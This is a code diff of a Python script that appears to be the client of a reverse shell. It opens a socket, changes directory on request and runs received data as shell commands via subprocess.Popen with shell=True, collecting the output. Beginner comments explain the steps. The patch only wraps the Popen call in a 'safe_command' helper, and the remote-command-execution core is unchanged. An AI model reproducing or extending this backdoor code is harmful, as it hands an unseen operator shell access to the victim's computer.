@@ -2,6 +2,8 @@ import socket
 import os
 import subprocess
 from sys import stderr
+from security import safe_command
+
 #subprocess is the proccess that exist on the windows computer
 
 s= socket.socket()
@@ -16,7 +18,7 @@ while True:
         os.chdir(data[3:].decode("utf-8"))
 
     if len(data) > 0:
-        cmd= subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+        cmd= safe_command.run(subprocess.Popen, data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
         #popen open the cmd then it execute command and shell = true can give permission to execute shell commands
         
         output_byte= cmd.stdout.read() + cmd.stderr.read()
